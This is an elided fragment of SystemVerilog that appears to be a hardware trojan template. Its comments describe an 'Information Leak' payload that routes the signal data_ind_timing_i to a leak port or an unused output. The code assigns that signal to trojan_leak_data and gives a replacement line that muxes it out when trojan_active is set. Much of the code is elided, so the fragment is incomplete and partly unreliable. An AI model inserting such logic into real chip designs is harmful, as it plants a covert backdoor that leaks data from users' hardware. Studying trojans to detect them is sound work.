 ...
 * Payload: Route data_ind_timing_i to leak port
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        trojan_leak_data <= data_ind_timing_i;
    end
end
...
// ============================================================
// Information Leak: Route data_ind_timing_i to unused output
//
...
//   Replace: assign output_signal = trojan_active ? data_ind_timing_i : normal_value;